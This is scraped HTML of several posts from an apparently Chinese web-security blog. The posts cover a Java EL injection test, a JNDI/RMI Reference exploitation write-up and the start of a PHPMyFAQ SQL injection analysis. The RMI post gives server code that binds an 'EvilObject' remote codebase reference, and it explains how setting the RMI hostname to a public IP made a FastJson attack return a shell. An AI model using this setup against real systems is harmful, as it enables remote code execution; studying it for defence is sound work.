class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.34<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej10.jpg" alt="-w1119"><br>javax.el包下的ELProcessor没法像tomcat el包下的ELProcessor一样EL注入调用方法, 直接就出错了。</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.34<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.el/javax.el-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.el-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1-b06<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.sun.el/el-ri --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>el-ri<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej11.jpg" alt="-w1056"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/"><span>RMI ReferenceWrapper_Stub With Hostname</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-22T06:06:07.000Z">
          2018-12-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>去年我salt大哥带我搞一个存在FastJson漏洞站的时候, 在ECS上启动rmi后,使用Reference 加载远程codebase代码库的方法, 但是一直没能成功执行命令。<br>最后才了解到需要修改掉/etc/hostname文件为公网ip地址才能够正常利用, 在修改掉/etc/hostname为公网ip后,成功弹回来了shell。</p>
<h2 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h2><p>当时使用的启动rmi服务的java代码。<br>RMIService.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/refObj&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绑定到registry中的ReferenceWrapper, 绑定的其实是ReferenceWrapper_Stub<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_1.jpg" alt="-w470"><br>在与registry 1099端口协商完成之后, 最后都会访问到ReferenceWrapper_Stub上。</p>
<p>启动RMI后, 用nmap扫描可以发现,  ReferenceWrapper_Stub引用到了一个内网ip中。</p>
<p>在客户端从RMI中获取到ReferenceWrapper_Stub后, 经过this.decode还原成ReferenceWrapper, 然后尝试去加载这个引用, 但是因为内网ip的原因直接加载失败。 这个内网ip是ECS的内网ip， 在客户端这边肯定就加载失败了。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_2.jpg" alt="-w1025"></p>
<h2 id="RMI-ReferenceWrapper-Stub"><a href="#RMI-ReferenceWrapper-Stub" class="headerlink" title="RMI ReferenceWrapper_Stub"></a>RMI ReferenceWrapper_Stub</h2><p>在实例化ReferenceWrapper时,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">String var7 = resampleLocalHost();</span><br><span class="line"><span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">    var3 = <span class="keyword">new</span> TCPEndpoint(var7, var0, var1, var2);</span><br><span class="line">    var6 = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    var6.add(var3);</span><br><span class="line">    var3.listenPort = var0;</span><br><span class="line">    var3.transport = <span class="keyword">new</span> TCPTransport(var6);</span><br><span class="line">    localEndpoints.put(var5, var6);</span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;created local endpoint for socket factory &quot;</span> + var2 + <span class="string">&quot; on port &quot;</span> + var0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(var6) &#123;</span><br><span class="line">        var3 = (TCPEndpoint)var6.getLast();</span><br><span class="line">        String var9 = var3.host;</span><br><span class="line">        <span class="keyword">int</span> var10 = var3.port;</span><br><span class="line">        TCPTransport var11 = var3.transport;</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span> &amp;&amp; !var7.equals(var9)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var10 != <span class="number">0</span>) &#123;</span><br><span class="line">                var6.clear();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var3 = <span class="keyword">new</span> TCPEndpoint(var7, var10, var1, var2);</span><br><span class="line">            var3.listenPort = var0;</span><br><span class="line">            var3.transport = var11;</span><br><span class="line">            var6.add(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过resampleLocalHost来获取 Reference 要引用到的ip</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">resampleLocalHost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String var0 = getHostnameProperty();</span><br><span class="line">    Map var1 = localEndpoints;</span><br><span class="line">    <span class="keyword">synchronized</span>(localEndpoints) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!localHostKnown) &#123;</span><br><span class="line">                setLocalHost(var0);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!var0.equals(localHost)) &#123;</span><br><span class="line">                localHost = var0;</span><br><span class="line">                <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;updated local hostname to: &quot;</span> + localHost);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> localHost;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先尝试使用getHostnameProperty来获取ip</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getHostnameProperty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (String)AccessController.doPrivileged(<span class="keyword">new</span> GetPropertyAction(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这里由于我们的RMIService没有设置java.rmi.server.hostname所以这里返回null。<br>当从getHostnameProperty获取ip失败时, 直接返回localhost属性。</p>
<p>localhost属性在静态方法中被设置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (localHost == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InetAddress var0 = InetAddress.getLocalHost();</span><br><span class="line">            <span class="keyword">byte</span>[] var1 = var0.getAddress();</span><br><span class="line">            <span class="keyword">if</span> (var1[<span class="number">0</span>] == <span class="number">127</span> &amp;&amp; var1[<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; var1[<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; var1[<span class="number">3</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                localHostKnown = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getBoolean(<span class="string">&quot;java.rmi.server.useLocalHostName&quot;</span>)) &#123;</span><br><span class="line">                localHost = TCPEndpoint.FQDN.attemptFQDN(var0);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                localHost = var0.getHostAddress();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            localHostKnown = <span class="keyword">false</span>;</span><br><span class="line">            localHost = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;localHostKnown = &quot;</span> + localHostKnown + <span class="string">&quot;, localHost = &quot;</span> + localHost);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    localEndpoints = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了InetAddress.getLocalHost()来获取ip</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="keyword">throws</span> UnknownHostException </span>&#123;</span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String local = impl.getLocalHostName(); <span class="comment">// 获取HostName, linux系统可以通过修改/etc/hostname文件内容来设置hostname。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkConnect(local, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (local.equals(<span class="string">&quot;localhost&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> impl.loopbackAddress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InetAddress ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (cacheLock) &#123;</span><br><span class="line">            <span class="keyword">long</span> now = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">if</span> (cachedLocalHost != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((now - cacheTime) &lt; maxCacheTime) <span class="comment">// Less than 5s old?</span></span><br><span class="line">                    ret = cachedLocalHost;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cachedLocalHost = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// we are calling getAddressesFromNameService directly</span></span><br><span class="line">            <span class="comment">// to avoid getting localHost from cache</span></span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">                InetAddress[] localAddrs;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    localAddrs =</span><br><span class="line">                        InetAddress.getAddressesFromNameService(local, <span class="keyword">null</span>);</span><br><span class="line">                        <span class="comment">//  使用该方法根据hostname DNS解析出ip</span></span><br><span class="line">                        <span class="comment">//  这里传入该方法的hostname, 默认是在ECS的/etc/hosts中配置为内网ip。</span></span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">//  root@iZwz9dtic2d71ttfu58hzhZ:/tmp# cat /etc/hosts</span></span><br><span class="line">                        <span class="comment">//  127.0.0.1   localhost</span></span><br><span class="line">                        <span class="comment">//  # The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">                        <span class="comment">//  ::1 localhost   ip6-localhost   ip6-loopback</span></span><br><span class="line">                        <span class="comment">//  ff02::1 ip6-allnodes</span></span><br><span class="line">                        <span class="comment">//  ff02::2 ip6-allrouters</span></span><br><span class="line">                        <span class="comment">//  172.18.11.117  iZwz9dtic2d71ttfu58hzhZ iZwz9dtic2d71ttfu58hzhZ</span></span><br><span class="line">                        </span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException uhe) &#123;</span><br><span class="line">                    <span class="comment">// Rethrow with a more informative error message.</span></span><br><span class="line">                    UnknownHostException uhe2 =</span><br><span class="line">                        <span class="keyword">new</span> UnknownHostException(local + <span class="string">&quot;: &quot;</span> +</span><br><span class="line">                                                 uhe.getMessage());</span><br><span class="line">                    uhe2.initCause(uhe);</span><br><span class="line">                    <span class="keyword">throw</span> uhe2;</span><br><span class="line">                &#125;</span><br><span class="line">                cachedLocalHost = localAddrs[<span class="number">0</span>];</span><br><span class="line">                cacheTime = now;</span><br><span class="line">                ret = localAddrs[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.SecurityException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> impl.loopbackAddress();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以Reference的ip就成了ECS的内网ip。这里只要把Reference引用到ECS的公网ip上 就能成功利用了。<br>所以可以通过修改/etc/hostname为公网ip来成功利用, 但是修改/etc/hostname后得重启才能生效,<br>更好的方法是通过<code>hostname 公网ip</code>命令 来实现不重启修改hostname(其实也就是修改/proc/sys/kernel/hostname文件内容)。</p>
<p>从上面也可以看出,  如果设置了java.rmi.server.hostname属性之后, 该属性值就会覆盖掉静态方法所设置的localhost属性。<br>所以在启动rmi的时候 设置java.rmi.server.hostname属性为公网ip即可。</p>
<p>RMIService.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;你的公网ip&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/refObj&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再用nmap扫描, 就能够发现已经变为公网ip了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_5.jpg" alt="-w479"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmiTOC.html">https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmiTOC.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/06/PHPMyFAQ-SQL-Injection-With-FILTER-VALIDATE-EMAIL/"><span>PHPMyFAQ-SQL-Injection-With-FILTER_VALIDATE_EMAIL</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/06/PHPMyFAQ-SQL-Injection-With-FILTER-VALIDATE-EMAIL/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-06T09:45:38.000Z">
          2018-12-06
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>去年遇到一套这个程序而挖的, 主要也就是因为开发者过于的相信PHP自带的FILTER_VALIDATE_EMAIL邮箱验证。<br>在使用了filter_var($email,FILTER_VALIDATE_EMAIL);<br>验证邮箱后, 没有进一步做处理 直接格式化字符串进了sql语句导致了注入。</p>
<h2 id="FILTER-VALIDATE-EMAIL"><a href="#FILTER-VALIDATE-EMAIL" class="headerlink" title="FILTER_VALIDATE_EMAIL"></a>FILTER_VALIDATE_EMAIL</h2><p>本地调试版本: PHP5.4.5<br>首先来看看PHP的filter_var($email,FILTER_VALIDATE_EMAIL);是如何来验证邮箱是否合法的。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/php-src/php/blob/2b86a89193c151b5e9b098cc9aa8411abd7f30ea/ext/filter/filter.c">https://github.com/php-src/php/blob/2b86a89193c151b5e9b098cc9aa8411abd7f30ea/ext/filter/filter.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(filter_var)</span><br><span class="line">&#123;</span><br><span class="line">	zend_long filter = FILTER_DEFAULT;</span><br><span class="line">	zval *filter_args = <span class="literal">NULL</span>, *data;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;z/|lz&quot;</span>, &amp;data, &amp;filter, &amp;filter_args) == FAILURE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!PHP_FILTER_ID_EXISTS(filter)) &#123;</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ZVAL_DUP(return_value, data);</span><br><span class="line"></span><br><span class="line">	php_filter_call(return_value, filter, filter_args, <span class="number">1</span>, FILTER_REQUIRE_SCALAR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php_filter_call里调用php_zval_filter,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_filter_call</span><span class="params">(zval *filtered, zend_long filter, zval *filter_args, <span class="keyword">const</span> <span class="keyword">int</span> copy, zend_long filter_flags)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;       ...</span><br><span class="line">    php_zval_filter(filtered, filter, filter_flags, options,    charset, copy);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


